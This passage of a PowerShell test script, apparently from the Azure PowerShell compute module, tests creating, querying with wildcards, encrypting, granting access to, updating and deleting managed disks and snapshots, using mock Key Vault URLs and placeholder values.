














function Test-Disk
{
    
    $rgname = Get-ComputeTestResourceName;
    $diskname = 'disk' + $rgname;

    try
    {
        
        $loc = Get-ComputeVMLocation;
        New-AzResourceGroup -Name $rgname -Location $loc -Force;
        $subId = Get-SubscriptionIdFromResourceGroup $rgname;
        $mocksourcevault = '/subscriptions/' + $subId + '/resourceGroups/' + $rgname + '/providers/Microsoft.KeyVault/vaults/TestVault123';
        $mockkey = 'https://myvault.vault-int.azure-int.net/keys/mockkey/00000000000000000000000000000000';
        $mocksecret = 'https://myvault.vault-int.azure-int.net/secrets/mocksecret/00000000000000000000000000000000';
        $access = 'Read';

        
        $diskconfig = New-AzDiskConfig -Location $loc -DiskSizeGB 500 -SkuName UltraSSD_LRS -OsType Windows -CreateOption Empty -DiskMBpsReadWrite 8 -DiskIOPSReadWrite 500;
        Assert-AreEqual "UltraSSD_LRS" $diskconfig.Sku.Name;
        Assert-AreEqual 500 $diskconfig.DiskIOPSReadWrite;
        Assert-AreEqual 8 $diskconfig.DiskMBpsReadWrite;

        $diskconfig = New-AzDiskConfig -Location $loc -Zone "1" -DiskSizeGB 5 -AccountType Standard_LRS -OsType Windows -CreateOption Empty `
                                       -EncryptionSettingsEnabled $true -HyperVGeneration "V1";
        
        $diskconfig = Set-AzDiskDiskEncryptionKey -Disk $diskconfig -SecretUrl $mocksecret -SourceVaultId $mocksourcevault;
        $diskconfig = Set-AzDiskKeyEncryptionKey -Disk $diskconfig -KeyUrl $mockkey -SourceVaultId $mocksourcevault;
        Assert-AreEqual $mocksecret $diskconfig.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $diskconfig.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $diskconfig.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;
        Assert-AreEqual $mocksourcevault $diskconfig.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;

        
        $mockimage = '/subscriptions/' + $subId + '/resourceGroups/' + $rgname + '/providers/Microsoft.Compute/images/TestImage123';
        $diskconfig = Set-AzDiskImageReference -Disk $diskconfig -Id $mockimage -Lun 0;
        Assert-AreEqual $mockimage $diskconfig.CreationData.ImageReference.Id;
        Assert-AreEqual 0 $diskconfig.CreationData.ImageReference.Lun;

        $diskconfig.EncryptionSettingsCollection.Enabled = $false;
        $diskconfig.EncryptionSettingsCollection.EncryptionSettings = $null;
        $diskconfig.CreationData.ImageReference = $null;

        Assert-AreEqual "1" $diskconfig.Zones
        $diskconfig.Zones = $null

        $job = New-AzDisk -ResourceGroupName $rgname -DiskName $diskname -Disk $diskconfig -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;

        
        $wildcardRgQuery = ($rgname -replace ".$") + "*"
        $wildcardNameQuery = ($diskname -replace ".$") + "*"

        $disk = Get-AzDisk
        Assert-True { $disk.Count -ge 1 }
        
        $disk = Get-AzDisk -ResourceGroupName $rgname
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $disk.DiskSizeBytes;

        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $false $disk.EncryptionSettingsCollection.Enabled;

        $disk = Get-AzDisk -ResourceGroupName $wildcardRgQuery
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $disk.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $false $disk.EncryptionSettingsCollection.Enabled;

        $disk = Get-AzDisk -Name $diskname
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $disk.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $false $disk.EncryptionSettingsCollection.Enabled;

        $disk = Get-AzDisk -Name $wildcardNameQuery
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $disk.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $false $disk.EncryptionSettingsCollection.Enabled;

        $disk = Get-AzDisk -ResourceGroupName $wildcardRgQuery -Name $diskname
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $false $disk.EncryptionSettingsCollection.Enabled;

        $disk = Get-AzDisk -ResourceGroupName $wildcardRgQuery -Name $wildcardNameQuery
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $disk.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $false $disk.EncryptionSettingsCollection.Enabled;

        $disk = Get-AzDisk -ResourceGroupName $rgname -Name $wildcardNameQuery
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $false $disk.EncryptionSettingsCollection.Enabled;

        $disk = Get-AzDisk -ResourceGroupName $rgname -DiskName $diskname;
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $disk.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $false $disk.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual "V1" $disk.HyperVGeneration;

        
        $job = Grant-AzDiskAccess -ResourceGroupName $rgname -DiskName $diskname -Access $access -DurationInSecond 5 -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Assert-NotNull $st.AccessSAS;

        $job = Revoke-AzDiskAccess -ResourceGroupName $rgname -DiskName $diskname -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Verify-PSOperationStatusResponse $st;

        
        $updateconfig = New-AzDiskUpdateConfig -DiskSizeGB 10 -AccountType UltraSSD_LRS -OsType Windows -DiskMBpsReadWrite 8 -DiskIOPSReadWrite 500;
        Assert-AreEqual "UltraSSD_LRS" $updateconfig.Sku.Name;
        Assert-AreEqual 500 $updateconfig.DiskIOPSReadWrite;
        Assert-AreEqual 8 $updateconfig.DiskMBpsReadWrite

        $updateconfig = New-AzDiskUpdateConfig -DiskSizeGB 10 -AccountType Premium_LRS -OsType Windows;
        $job = Update-AzDisk -ResourceGroupName $rgname -DiskName $diskname -DiskUpdate $updateconfig -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;

        $disk = Get-AzDisk -ResourceGroupName $rgname -DiskName $diskname;
        Assert-AreEqual (10 * 1073741824) $disk.DiskSizeBytes;

        
        $job = Remove-AzDisk -ResourceGroupName $rgname -DiskName $diskname -Force -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Verify-PSOperationStatusResponse $st;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}

function Test-Snapshot
{
    
    $rgname = Get-ComputeTestResourceName;
    $snapshotname = 'snapshot' + $rgname;

    try
    {
        
        $loc = Get-ComputeVMLocation;
        New-AzResourceGroup -Name $rgname -Location $loc -Force;
        $subId = Get-SubscriptionIdFromResourceGroup $rgname;
        $mocksourcevault = '/subscriptions/' + $subId + '/resourceGroups/' + $rgname + '/providers/Microsoft.KeyVault/vaults/TestVault123';
        $mockkey = 'https://myvault.vault-int.azure-int.net/keys/mockkey/00000000000000000000000000000000';
        $mocksecret = 'https://myvault.vault-int.azure-int.net/secrets/mocksecret/00000000000000000000000000000000';
        $access = 'Read';

        
        $snapshotconfig = New-AzSnapshotConfig -Location $loc -DiskSizeGB 5 -AccountType Standard_LRS -OsType Windows -CreateOption Empty `
                                               -EncryptionSettingsEnabled $true  -HyperVGeneration "V2";

        
        $snapshotconfig = Set-AzSnapshotDiskEncryptionKey -Snapshot $snapshotconfig -SecretUrl $mocksecret -SourceVaultId $mocksourcevault;
        $snapshotconfig = Set-AzSnapshotKeyEncryptionKey -Snapshot $snapshotconfig -KeyUrl $mockkey -SourceVaultId $mocksourcevault;
        Assert-AreEqual $mocksecret $snapshotconfig.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshotconfig.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshotconfig.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;
        Assert-AreEqual $mocksourcevault $snapshotconfig.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;

        
        $mockimage = '/subscriptions/' + $subId + '/resourceGroups/' + $rgname + '/providers/Microsoft.Compute/images/TestImage123';
        $snapshotconfig = Set-AzSnapshotImageReference -Snapshot $snapshotconfig -Id $mockimage -Lun 0;
        Assert-AreEqual $mockimage $snapshotconfig.CreationData.ImageReference.Id;
        Assert-AreEqual 0 $snapshotconfig.CreationData.ImageReference.Lun;

        $snapshotconfig.EncryptionSettingsCollection.Enabled = $false;
        $snapshotconfig.EncryptionSettingsCollection.EncryptionSettings = $null;
        $snapshotconfig.CreationData.ImageReference = $null;
        $job = New-AzSnapshot -ResourceGroupName $rgname -SnapshotName $snapshotname -Snapshot $snapshotconfig -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;

        
        $wildcardRgQuery = ($rgname -replace ".$") + "*"
        $wildcardNameQuery = ($snapshotname -replace ".$") + "*"

        $snapshot = Get-AzSnapshot
        Assert-True { $snapshot.Count -ge 1 }

        $snapshot = Get-AzSnapshot -ResourceGroupName $rgname
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $snapshot.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $false $snapshot.EncryptionSettingsCollection.Enabled;

        $snapshot = Get-AzSnapshot -ResourceGroupName $wildcardRgQuery
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $snapshot.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $false $snapshot.EncryptionSettingsCollection.Enabled;

        $snapshot = Get-AzSnapshot -SnapshotName $snapshotname;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $snapshot.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $false $snapshot.EncryptionSettingsCollection.Enabled;

        $snapshot = Get-AzSnapshot -SnapshotName $wildcardNameQuery;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $snapshot.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $false $snapshot.EncryptionSettingsCollection.Enabled;

        $snapshot = Get-AzSnapshot -ResourceGroupName $wildcardRgQuery -SnapshotName $wildcardNameQuery;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $snapshot.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $false $snapshot.EncryptionSettingsCollection.Enabled;

        $snapshot = Get-AzSnapshot -ResourceGroupName $wildcardRgQuery -SnapshotName $snapshotname;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $snapshot.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $false $snapshot.EncryptionSettingsCollection.Enabled;

        $snapshot = Get-AzSnapshot -ResourceGroupName $rgname -SnapshotName $wildcardNameQuery;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $snapshot.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $false $snapshot.EncryptionSettingsCollection.Enabled;

        $snapshot = Get-AzSnapshot -ResourceGroupName $rgname -SnapshotName $snapshotname;
        Assert-AreEqual 5 $snapshot.DiskSizeGB;
        Assert-AreEqual (5 * 1073741824) $snapshot.DiskSizeBytes;
        Assert-AreEqual "Standard_LRS" $snapshot.Sku.Name;
        Assert-AreEqual Windows $snapshot.OsType;
        Assert-AreEqual Empty $snapshot.CreationData.CreateOption;
        Assert-AreEqual $false $snapshot.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual "V2" $snapshot.HyperVGeneration;
        Assert-False {$snapshot.Incremental}

        
        $job = Grant-AzSnapshotAccess -ResourceGroupName $rgname -SnapshotName $snapshotname -Access $access -DurationInSecond 5 -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Assert-NotNull $st.AccessSAS;

        $job = Revoke-AzSnapshotAccess -ResourceGroupName $rgname -SnapshotName $snapshotname -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Verify-PSOperationStatusResponse $st;

        
        $updateconfig = New-AzSnapshotUpdateConfig -DiskSizeGB 10 -AccountType Premium_LRS -OsType Windows;
        $job = Update-AzSnapshot -ResourceGroupName $rgname -SnapshotName $snapshotname -SnapshotUpdate $updateconfig -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;

        $snapshot = Get-AzSnapshot -ResourceGroupName $rgname -SnapshotName $snapshotname;
        Assert-AreEqual (10 * 1073741824) $snapshot.DiskSizeBytes;

        
        $job = Remove-AzSnapshot -ResourceGroupName $rgname -SnapshotName $snapshotname -Force -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Verify-PSOperationStatusResponse $st;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}

function Test-DiskEncrypt
{
    
    $rgname = 'mytestrg'
    [string]$loc = Get-ComputeVMLocation;
    $loc = $loc.Replace(' ', '');
    $diskname = 'disk' + $rgname;
    $vaultName = 'kv' + $rgname
    $kekName = 'kek' + $rgname
    $secretname = 'mysecret'
    $secretdata = 'mysecretvalue'
    $securestring = ConvertTo-SecureString $secretdata -Force -AsPlainText

    
    
    
    
    
    
    
    
    
    
    

    try
    {
        $subId = Get-SubscriptionIdFromResourceGroup $rgname;
        $mockkey = "https://kvmytestrg.vault.azure.net:443/keys/kekmytestrg/f97010094ad141daa9c162ebb7651bc0"
        $mocksecret = "https://kvmytestrg.vault.azure.net:443/secrets/mysecret/8c03adb6d78e476b93db022f87b4a1e1"
        $mocksourcevault = '/subscriptions/' + $subId + '/resourceGroups/' + $rgname + '/providers/Microsoft.KeyVault/vaults/' + $vaultName;
        $access = 'Read';

        
        $diskconfig = New-AzDiskConfig -Location $loc -DiskSizeGB 500 -SkuName UltraSSD_LRS -OsType Windows -CreateOption Empty -DiskMBpsReadWrite 8 -DiskIOPSReadWrite 500;
        Assert-AreEqual "UltraSSD_LRS" $diskconfig.Sku.Name;
        Assert-AreEqual 500 $diskconfig.DiskIOPSReadWrite;
        Assert-AreEqual 8 $diskconfig.DiskMBpsReadWrite

        $diskconfig = New-AzDiskConfig -Location $loc -Zone "1" -DiskSizeGB 5 -AccountType Standard_LRS -OsType Windows -CreateOption Empty -EncryptionSettingsEnabled $true;
        
        $diskconfig = Set-AzDiskDiskEncryptionKey -Disk $diskconfig -SecretUrl $mocksecret -SourceVaultId $mocksourcevault;
        $diskconfig = Set-AzDiskKeyEncryptionKey -Disk $diskconfig -KeyUrl $mockkey -SourceVaultId $mocksourcevault;
        Assert-AreEqual $mocksecret $diskconfig.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $diskconfig.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $diskconfig.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;
        Assert-AreEqual $mocksourcevault $diskconfig.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;

        
        $mockimage = '/subscriptions/' + $subId + '/resourceGroups/' + $rgname + '/providers/Microsoft.Compute/images/TestImage123';
        $diskconfig = Set-AzDiskImageReference -Disk $diskconfig -Id $mockimage -Lun 0;
        Assert-AreEqual $mockimage $diskconfig.CreationData.ImageReference.Id;
        Assert-AreEqual 0 $diskconfig.CreationData.ImageReference.Lun;
        $diskconfig.CreationData.ImageReference = $null;

        Assert-AreEqual "1" $diskconfig.Zones
        $diskconfig.Zones = $null

        $job = New-AzDisk -ResourceGroupName $rgname -DiskName $diskname -Disk $diskconfig -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;

        
        $wildcardRgQuery = ($rgname -replace ".$") + "*"
        $wildcardNameQuery = ($diskname -replace ".$") + "*"

        $disk = Get-AzDisk
        Assert-True { $disk.Count -ge 1 }

        $disk = Get-AzDisk -ResourceGroupName $rgname
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;        
        Assert-AreEqual $true $disk.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $disk = Get-AzDisk -ResourceGroupName $wildcardRgQuery
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $true $disk.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $disk = Get-AzDisk -Name $diskname
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $true $disk.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $disk = Get-AzDisk -Name $wildcardNameQuery
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $true $disk.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $disk = Get-AzDisk -ResourceGroupName $wildcardRgQuery -Name $diskname
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $true $disk.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $disk = Get-AzDisk -ResourceGroupName $wildcardRgQuery -Name $wildcardNameQuery
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $true $disk.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $disk = Get-AzDisk -ResourceGroupName $rgname -Name $wildcardNameQuery
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $true $disk.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;

        $disk = Get-AzDisk -ResourceGroupName $rgname -DiskName $diskname;
        Assert-AreEqual $null $disk.Zones;
        Assert-AreEqual 5 $disk.DiskSizeGB;
        Assert-AreEqual "Standard_LRS" $disk.Sku.Name;
        Assert-AreEqual Windows $disk.OsType;
        Assert-AreEqual Empty $disk.CreationData.CreateOption;
        Assert-AreEqual $true $disk.EncryptionSettingsCollection.Enabled;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mocksecret $disk.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $disk.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;
        Assert-Null $disk.HyperVGeneration;

        
        $job = Grant-AzDiskAccess -ResourceGroupName $rgname -DiskName $diskname -Access $access -DurationInSecond 5 -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Assert-NotNull $st.AccessSAS;

        $job = Revoke-AzDiskAccess -ResourceGroupName $rgname -DiskName $diskname -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Verify-PSOperationStatusResponse $st;

        
        $updateconfig = New-AzDiskUpdateConfig -DiskSizeGB 10 -AccountType UltraSSD_LRS -OsType Windows -DiskMBpsReadWrite 8 -DiskIOPSReadWrite 500;
        Assert-AreEqual "UltraSSD_LRS" $updateconfig.Sku.Name;
        Assert-AreEqual 500 $updateconfig.DiskIOPSReadWrite;
        Assert-AreEqual 8 $updateconfig.DiskMBpsReadWrite

        $updateconfig = New-AzDiskUpdateConfig -DiskSizeGB 10 -AccountType Premium_LRS -OsType Windows;
        $job = Update-AzDisk -ResourceGroupName $rgname -DiskName $diskname -DiskUpdate $updateconfig -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;

        
        $job = Remove-AzDisk -ResourceGroupName $rgname -DiskName $diskname -Force -AsJob;
        $result = $job | Wait-Job;
        Assert-AreEqual "Completed" $result.State;
        $st = $job | Receive-Job;
        Verify-PSOperationStatusResponse $st;
    }
    finally
    {
        
        
    }
}

function Test-SnapshotEncrypt
{
    
    $rgname = 'mytestrg';
    [string]$loc = Get-ComputeVMLocation;
    $loc = $loc.Replace(' ', '');
    $snapshotname = 'snapshot' + $rgname;
    $vaultName = 'kv' + $rgname
    $kekName = 'kek' + $rgname
    $secretname = 'mysecret'
    $secretdata = 'mysecretvalue'
    $securestring = ConvertTo-SecureString $secretdata -Force -AsPlainText

    
    
    
    
    
    
    
    
    
    
    

    try
    {
        $subId = Get-SubscriptionIdFromResourceGroup $rgname;
        $mockkey = "https://kvmytestrg.vault.azure.net:443/keys/kekmytestrg/f97010094ad141daa9c162ebb7651bc0"
        $mocksecret = "https://kvmytestrg.vault.azure.net:443/secrets/mysecret/8c03adb6d78e476b93db022f87b4a1e1"
        $mocksourcevault = '/subscriptions/' + $subId + '/resourceGroups/' + $rgname + '/providers/Microsoft.KeyVault/vaults/' + $vaultName;
        $access = 'Read';

        
        $snapshotconfig = New-AzSnapshotConfig -Location $loc -DiskSizeGB 5 -AccountType Standard_LRS -OsType Windows -CreateOption Empty -EncryptionSettingsEnabled $true;

        
        $snapshotconfig = Set-AzSnapshotDiskEncryptionKey -Snapshot $snapshotconfig -SecretUrl $mocksecret -SourceVaultId $mocksourcevault;
        $snapshotconfig = Set-AzSnapshotKeyEncryptionKey -Snapshot $snapshotconfig -KeyUrl $mockkey -SourceVaultId $mocksourcevault;
        Assert-AreEqual $mocksecret $snapshotconfig.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SecretUrl;
        Assert-AreEqual $mocksourcevault $snapshotconfig.EncryptionSettingsCollection.EncryptionSettings[0].DiskEncryptionKey.SourceVault.Id;
        Assert-AreEqual $mockkey $snapshotconfig.EncryptionSettingsCollection.EncryptionSettings[0].KeyEncryptionKey.KeyUrl;
